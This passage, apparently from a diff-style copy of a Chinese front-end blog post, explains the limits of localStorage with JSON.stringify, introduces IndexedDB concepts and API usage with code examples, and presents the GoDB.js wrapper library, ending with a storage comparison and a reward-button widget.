+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// "{"c":{},"d":"2021-02-02T19:40:12.346Z"}"</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// {c: {}, d: "2021-02-02T19:40:12.346Z"}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>如上，<code>JSON.stringify()</code> 无法正确转换 JS 的部分属性</p>
+<ul>
+<li>undefiend</li>
+<li>Function</li>
+<li>RegExp（正则表达式，转换后变成了空对象）</li>
+<li>Date（转换后变成了字符串，而非 Date 类的对象）</li>
+</ul>
+<p>其实还有个 Symbol 也无法被转换，但由于 Symbol 本身定义（全局唯一性）就决定了，它不应该被转换，否则即使转换回来，也不会是原来那个 Symbol</p>
+<p>Function 也比较特殊，不过要兼容的话，可以先调用 <code>.toString()</code> 转换为字符串储存，需要的时候再 <code>eval</code> 转回来</p>
+<p>以及，<code>JSON.stringify()</code> 无法转换循环引用的对象</p>
+<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> a <span class="token operator">=</span> <span class="token punctuation">{</span> key<span class="token punctuation">:</span> <span class="token string">'value'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
+a<span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">;</span>
+JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">// Uncaught TypeError: Converting circular structure to JSON</span>
+<span class="token comment" spellcheck="true">//     --> starting at object with constructor 'Object'</span>
+<span class="token comment" spellcheck="true">//     --- property 'a' closes the circle</span>
+<span class="token comment" spellcheck="true">//     at JSON.stringify (&lt;anonymous>)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>大部分应用中，<code>JSON.stringify()</code> 的这个问题基本上可以忽略，但是一小部分场景还是会导致问题，比如想保存一个正则表达式，一个 Date 对象，这种方法就会出问题</p>
+<p><strong>总结</strong></p>
+<p>在大部分应用场景下，LocalStorage 已经能完全替代 Cookie，只有类似于广告这种场景，由于 Cookie 可以被服务端设置，Cookie 仍存在不可替代的价值</p>
+<p>但是 LocalStorage 并不完美，它只支持 10MB 储存，在一些应用场景还是不够用，并且原生只支持字符串，<code>JSON.stringify()</code> 的解决方案又不够完美，因此很多时候不太适合大量数据和复杂数据的储存</p>
+<h2 id="IndexedDB"><a href="#IndexedDB" class="headerlink" title="IndexedDB"></a>IndexedDB</h2><p>IndexedDB 的全称是 Indexed Database，从名字中就可以看出，它是一个数据库</p>
+<p>IndexedDB 早在 2009 年就有了第一次提案，但其实它和 Web Storage 几乎是同一时间普及到各大浏览器的（没错，就是 2015 年那会，es6 也是那时候）</p>
+<p>IndexedDB 是一个正经的数据库，它在问世后替代了原来不正经的 Web SQL 方案，成为了当今唯一运行在浏览器里的数据库</p>
+<p>在我看来，IndexedDB 其实更适合当作终极前端本地数据储存方案</p>
+<p>相比于 LocalStorage，IndexedDB 的<strong>优点</strong>是</p>
+<ul>
+<li><p>储存量理论上没有上限</p>
+</li>
+<li><ul>
+<li>Chrome 对 IndexedDB 储存空间限制的定义是：硬盘可用空间的三分之一</li>
+</ul>
+</li>
+<li><p>所有操作都是异步的，相比 LocalStorage 同步操作性能更高，尤其是数据量较大时</p>
+</li>
+<li><p>原生支持储存 JS 的对象</p>
+</li>
+<li><p>是个正经的数据库，意味着数据库能干的事它都能干</p>
+</li>
+</ul>
+<p>但是缺点也比较致命：</p>
+<ul>
+<li>操作非常繁琐</li>
+<li>本身有一定门槛（需要你懂数据库的概念）</li>
+</ul>
+<p>由于提案较早，IndexedDB 的 API 设计其实是比较糟糕的，对于新手而言，光是想连上数据库，并往里面加东西，都需要折腾半天</p>
+<p>对于简单的数据储存而言，IndexedDB 的 API 显得太复杂了，再加上其 API 全是异步的，会带来额外的心智负担，远没有 LocalStorage 简单两行代码搞定数据存取来的快</p>
+<p>因此，IndexedDB 在今天的使用规模相比 LocalStorage 差远了，即使 IndexedDB 本身的设计其实更适合用来在浏览器上储存数据</p>
+<p>总之，如果不考虑 IndexedDB 的操作难度，其作为一个前端本地储存方案其实是接近完美的</p>
+<h3 id="简单理解数据库"><a href="#简单理解数据库" class="headerlink" title="简单理解数据库"></a>简单理解数据库</h3><p>在使用 IndexedDB 前，你首先需要懂基本的数据库概念</p>
+<p>这里用 Excel 类比，简单介绍数据库的基本概念，不做太深入的讨论</p>
+<p>需要了解四个基本概念，以关系型数据库为例</p>
+<ul>
+<li>数据库 Database</li>
+<li>数据表 Table（IndexedDB 中叫 ObjectStore）</li>
+<li>字段 Field</li>
+<li>事务 Transaction</li>
+</ul>
+<p>（虽然 IndexedDB 算不上关系型数据库，但概念都是相通的）</p>
+<p>假设清华和北大各自需要建一个数据库，用来存各自学生与教工的信息，假设命名为</p>
+<ul>
+<li>清华：<code>thu</code></li>
+<li>北大：<code>pku</code></li>
+</ul>
+<p>这样，清北之间的数据就可以相互独立</p>
+<p>然后，我们再到数据库里建表</p>
+<ul>
+<li><code>student</code> 表，储存学生信息</li>
+<li><code>stuff</code> 表，储存教工信息</li>
+</ul>
+<p>数据表（Table）是什么？说白了，就是一个类似于 Excel 表一样的东西</p>
+<p>比如 <code>student</code> 表，可以长这样：</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpth1f4rbtj30gr02uweb.jpg" alt="图片">  </p>
+<p>上面的 学号、姓名、年龄、专业 就是数据表的字段</p>
+<p>当我们想往 <code>student</code> 表添加数据时，就需要按照规定的格式，往表里加数据（关系型数据库的特点，而 IndexedDB 允许不遵守格式）</p>
+<p>数据库也给我们提供了方法，当我们知道一个学生的学号（id），就可以在非常短的时间内，在表里成千上万个学生中，快速找到这个学生，并返回他的完整信息</p>
+<p>也可以根据 id 定位，对该学生的数据进行修改，或者删除</p>
+<p>id 这种每条数据唯一的值，就可以被用来做主键（primary key），主键在表内独一无二，无法添加相同主键的数据</p>
+<p>而主键一般会被建立索引，所谓对字段建立索引，就是可以根据这个字段的值，在表里非常快速的找到对应的数据（通常不高于 O(logN)），如果没有索引，那可能就需要遍历整个表（O(N)）</p>
+<p>增、删、改、查这些操作，都需要通过事务 Transaction 来完成</p>
+<ul>
+<li>如果事务中任何一个操作没有成功，整个事务都会回滚</li>
+<li>在事务完成之前，操作不会影响数据库</li>
+<li>不同事务之间不能互相影响</li>
+</ul>
+<p>举个例子，当你发起一个事务，想利用这个事务添加两个学生，如果第一个学生添加成功，但是第二个学生添加失败，事务就会回滚，第一个学生将根本不会在数据库中出现过</p>
+<p>事务在银行转账这种场景非常有用：如果转账中任何一步失败了，整个转账操作就和没发生过一样，不会造成任何影响</p>
+<p>在同一个 Excel 文件（数据库）中，我们除了 <code>student</code> 表，还可以有 <code>stuff</code> 表（同一个数据库中有了两个不同的数据表）：</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpth1pvekmj30gr05c0sm.jpg" alt="图片">  </p>
+<p>然后，清华和北大各自分一个 Excel 文件，就相当于分了两个数据库</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpth20n6urj306h0390si.jpg" alt="图片">  </p>
+<p>总而言之，不扯数据库各种难理解的概念，我们其实完全可以用 Excel 来类比数据库</p>
+<ul>
+<li>一个 Excel 文件就是一个 Database</li>
+<li>一个 Excel（Database）里可以有很多不同表格（数据表 Table）</li>
+<li>表格的列的名称其实就是字段</li>
+</ul>
+<p>上述类比最接近 MySQL 这种关系型数据库，但放在其它一些比较特殊的数据库上可能就不太妥当（比如图数据库）</p>
+<p>如果你是新手，用 Excel 类比理解数据库完全没问题，足以使用 IndexedDB 了</p>
+<p>虽然说 IndexedDB 使用 key-value 的模式储存数据，但你也完全可以用数据表 Table 的模式来看待它</p>
+<h3 id="IndexedDB-的使用"><a href="#IndexedDB-的使用" class="headerlink" title="IndexedDB 的使用"></a>IndexedDB 的使用</h3><p>使用 IndexedDB 的第一步是打开数据库：</p>
+<pre><code>const request = window.indexedDB.open(&#39;pku&#39;);</code></pre><p>上面这个操作打开了名为 <code>pku</code> 的数据库，如果不存在，浏览器会自动创建</p>
+<p>然后 <code>request</code> 上有三个事件：</p>
+<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> db<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 全局 IndexedDB 数据库实例</span>
+
+request<span class="token punctuation">.</span>onupgradeneeded <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  db <span class="token operator">=</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">;</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'version change'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+request<span class="token punctuation">.</span>onsuccess <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  db <span class="token operator">=</span> request<span class="token punctuation">.</span>result<span class="token punctuation">;</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'db connected'</span><span class="token punctuation">)</span>l<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+request<span class="token punctuation">.</span>onblocked <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'db request blocked!'</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
+
+request<span class="token punctuation">.</span>onerror <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'error!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>IndexedDB 有一个版本（version）的概念，连接数据库时就可以指定版本</p>
+<pre><code>const version = 1;
+const request = window.indexedDB.open(&#39;pku&#39;, version);</code></pre><p>版本主要用来控制数据库的结构，当数据库结构（表结构）发生变化时，版本也会变化</p>
+<p>如上，<code>request</code> 上有四个事件：</p>
+<ul>
+<li><p><code>onupgradeneeded</code> 在版本改变时触发</p>
+</li>
+<li><ul>
+<li>注意首次连接数据库时，版本从 0 变成 1，因此也会触发，且先于 <code>onsuccess</code></li>
+</ul>
+</li>
+<li><p><code>onsuccess</code> 在连接成功后触发</p>
+</li>
+<li><p><code>onerror</code> 在连接失败时触发</p>
+</li>
+<li><p><code>onblocked</code> 在连接被阻止的时候触发，比如打开版本低于当前存在的版本</p>
+</li>
+</ul>
+<p>注意这四个事件都是异步的，意味着在连接 IndexedDB 的请求发出去后，需要过一段时间才能连上数据库，并进行操作</p>
+<p>开发者对数据库的所有操作，都得放在异步连上数据库之后，这有的时候会带来很大的不便</p>
+<p>而开发者如果想创建数据表（在 IndexedDB 里面叫做 ObjectStore），只能将其放到 <code>onupgradeneeded</code> 事件中（官方的定义是需要一个 <code>IDBVersionChange</code> 的事件）</p>
+<pre class="line-numbers language-js"><code class="language-js">request<span class="token punctuation">.</span>onupgradeneeded <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    db <span class="token operator">=</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>db<span class="token punctuation">.</span>objectStoreNames<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">'student'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        db<span class="token punctuation">.</span><span class="token function">createObjectStore</span><span class="token punctuation">(</span><span class="token string">'student'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
+            keyPath<span class="token punctuation">:</span> <span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 主键</span>
+            autoIncrement<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token comment" spellcheck="true">// 自增</span>
+        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>上面这段代码，在数据库初始化时，创建了一个 <code>student</code> 的表，并且以 <code>id</code> 为自增主键（每加一条数据，主键会自动增长，无需开发者指定）</p>
+<p>在这一切做好以后，终于，我们可以连接数据库，然后添加数据了</p>
+<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> adding <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token string">'student'</span><span class="token punctuation">,</span> <span class="token string">'readwrite'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 创建事务</span>
+  <span class="token punctuation">.</span><span class="token function">objectStore</span><span class="token punctuation">(</span><span class="token string">'student'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 指定 student 表</span>
+  <span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span> name<span class="token punctuation">:</span> <span class="token string">'luke'</span><span class="token punctuation">,</span> age<span class="token punctuation">:</span> <span class="token number">22</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+adding<span class="token punctuation">.</span>onsuccess <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'write success'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+adding<span class="token punctuation">.</span>onerror <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'write failed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>用同样的方法再加一条数据</p>
+<pre><code>db.transaction(&#39;student&#39;, &#39;readwrite&#39;)
+  .objectStore(&#39;student&#39;)
+  .add({ name: &#39;elaine&#39;, age: 23 });</code></pre><p>然后，打开浏览器的开发者工具，我们就能看到添加的数据：  <img src="https://tva1.sinaimg.cn/large/008i3skNly1gpth2kbvrej30is0380st.jpg" alt="图片">  </p>
+<p>这里可以看到 IndexedDB 的 key-value 储存特性，key 就是主键（这里指定主键为 <code>id</code>），value 就是剩下的字段和对应的数据</p>
+<p>这个 key-value 结构对应的 Table 结构如下：  </p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpth2yd01fj30nf036jra.jpg" alt="图片">  </p>
+<p>如果要获取数据，需要一个 <code>readonly</code> 的 Transaction</p>
+<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> request <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token string">'student'</span><span class="token punctuation">,</span> <span class="token string">'readonly'</span><span class="token punctuation">)</span>
+  <span class="token punctuation">.</span><span class="token function">objectStore</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span>
+  <span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 获取 id 为 2 的数据</span>
+
+request<span class="token punctuation">.</span>onsuccess <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// { id: 2, name: 'elaine', age: 23 }</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>综上，哪怕只是想简单的往 IndexedDB 里增加和查询数据，都需要写一大堆代码，操作非常繁琐，一不小心还容易掉坑里</p>
+<p>那么，有没有什么办法，能更优雅的使用 IndexedDB，在代码量减少的情况下，还能更好的发挥其实力呢？</p>
+<h2 id="GoDB-js"><a href="#GoDB-js" class="headerlink" title="GoDB.js"></a>GoDB.js</h2><p><code>GoDB.js</code> 是一个基于 IndexedDB 实现前端本地储存的类库</p>
+<p>帮你做到代码更简洁的同时，更好的发挥 IndexedDB 的实力</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpth3onip5j30u00bjjs0.jpg" alt="图片"></p>
+<p>首先安装：</p>
+<pre><code>npm install godb</code></pre><p>对 IndexedDB 的增删改查，一行代码就可以搞定！</p>
+<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> GoDB <span class="token keyword">from</span> <span class="token string">'godb'</span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> testDB <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GoDB</span><span class="token punctuation">(</span><span class="token string">'testDB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 连接数据库</span>
+<span class="token keyword">const</span> user <span class="token operator">=</span> testDB<span class="token punctuation">.</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 获取数据表</span>
+
+<span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token punctuation">{</span> name<span class="token punctuation">:</span> <span class="token string">'luke'</span><span class="token punctuation">,</span> age<span class="token punctuation">:</span> <span class="token number">22</span> <span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 随便定义一个对象</span>
+
+user<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 增</span>
+  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>luke <span class="token operator">=</span><span class="token operator">></span> user<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>luke<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 查</span>
+  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>luke <span class="token operator">=</span><span class="token operator">></span> user<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token operator">...</span>luke<span class="token punctuation">,</span> age<span class="token punctuation">:</span> <span class="token number">23</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 改</span>
+  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>luke <span class="token operator">=</span><span class="token operator">></span> user<span class="token punctuation">.</span><span class="token keyword">delete</span><span class="token punctuation">(</span>luke<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 删</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>或者，一次性添加许多数据，然后看看效果：</p>
+<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token punctuation">{</span> name<span class="token punctuation">:</span> <span class="token string">'luke'</span><span class="token punctuation">,</span> age<span class="token punctuation">:</span> <span class="token number">22</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
+    <span class="token punctuation">{</span> name<span class="token punctuation">:</span> <span class="token string">'elaine'</span><span class="token punctuation">,</span> age<span class="token punctuation">:</span> <span class="token number">23</span> <span class="token punctuation">}</span>
+<span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+user<span class="token punctuation">.</span><span class="token function">addMany</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span>
+  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> user<span class="token punctuation">.</span><span class="token function">consoleTable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>上面这段代码，会在添加数据后，在控制台中展示出 <code>user</code> 表的内容：</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpth3xx3m1j30u0034weh.jpg" alt="图片"></p>
+<p>回到之前 LocalStorage 出问题的那个例子，用 <code>GoDB</code> 就可以实现正常储存：</p>
+<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> GoDB <span class="token keyword">from</span> <span class="token string">'godb'</span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> testDB <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GoDB</span><span class="token punctuation">(</span><span class="token string">'testDB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 连接数据库</span>
+<span class="token keyword">const</span> store <span class="token operator">=</span> testDB<span class="token punctuation">.</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'store'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 获取数据表</span>
+
+<span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>
+    a<span class="token punctuation">:</span> undefined<span class="token punctuation">,</span>
+    b<span class="token punctuation">:</span> <span class="token regex">/abc/</span><span class="token punctuation">,</span>
+    c<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+store<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>
+  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>item <span class="token operator">=</span><span class="token operator">></span> store<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 获取存进去的实例</span>
+  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">// {</span>
+<span class="token comment" spellcheck="true">//     id: 1,</span>
+<span class="token comment" spellcheck="true">//     a: undefined,</span>
+<span class="token comment" spellcheck="true">//     b: /abc/,</span>
+<span class="token comment" spellcheck="true">//     c: new Date()</span>
+<span class="token comment" spellcheck="true">// }</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>并且，循环引用的对象也能使用 <code>GoDB</code> 进行储存</p>
+<pre><code>const a = { key: &#39;value&#39; };
+a[&#39;a&#39;] = a;
+
+store.add(a)
+  .then(item =&gt; store.get(item.id)) // 获取存进去的实例
+  .then(result =&gt; console.log(result));
+
+// 打印出来的对象比 a 多了个 id，其它完全一致</code></pre><p>关于 <code>GoDB</code> 更详细的用法，可以参考 <code>GoDB</code> 的项目官网（不断完善中）：</p>
+<p><a href="https://godb-js.github.io/" target="_blank" rel="noopener">https://godb-js.github.io/</a></p>
+<p>总之，<code>GoDB</code> 可以</p>
+<ul>
+<li><p>帮你在背后处理好 IndexedDB 各种繁琐操作</p>
+</li>
+<li><p>帮你在背后维护好数据库、数据表和字段</p>
+</li>
+<li><ul>
+<li>以及字段的索引，各种属性（比如 <code>unique</code>）</li>
+</ul>
+</li>
+<li><p>帮你规范化 IndexedDB 的使用，使你的项目更易维护</p>
+</li>
+<li><p>最终，开放几个简单易用的 API 给你，让你用简洁的代码玩转 IndexedDB</p>
+</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结一下三大方案各自的特点以及适用场景：</p>
+<ul>
+<li><p>Cookie</p>
+</li>
+<li><ul>
+<li>能被服务器指定，浏览器会自动在请求中带上</li>
+<li>大小只有 4kb</li>
+<li>大规模应用于广告商定位用户</li>
+<li>配合 session 也是一个可行的登录鉴权方案</li>
+</ul>
+</li>
+<li><p>Web Storage</p>
+</li>
+<li><ul>
+<li>大小有 10MB，使用极其简单</li>
+<li>但是只能存字符串，需要转义才能存 JS 对象</li>
+<li>大部分情况下能完全替代 Cookie，且更安全</li>
+<li>配合 token 可以实现更安全的登录鉴权</li>
+</ul>
+</li>
+<li><p>IndexedDB</p>
+</li>
+<li><ul>
+<li>储存空间无上限，功能极其强大</li>
+<li>原生支持 JS 对象，能更好的储存数据</li>
+<li>以数据库的形式储存数据，数据管理更规范</li>
+<li>但是，原生 API 操作很繁琐，且有一定使用门槛</li>
+</ul>
+</li>
+</ul>
+<p>我个人是非常看好 IndexedDB 的，我认为在前端越来越复杂的未来，在下一个十年各种重前端应用（在线文档，各种 SaaS 应用），以及 Electron 环境中，IndexedDB 一定能够大放光彩</p>
+<ul>
+<li>比如缓存接口数据，实现更好的用户体验</li>
+<li>比如在线文档（富文本编辑器）保存编辑历史</li>
+<li>比如任何需要在前端保存大量数据的应用</li>
+</ul>
+<p>总之，IndexedDB 可以说是最适合用来在前端存数据的方案，只不过因为其繁琐的操作和一定的使用门槛，在目前没有更简单的 localStorage 使用范围那么广而已</p>
+
+            </div>
+            <hr/>
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
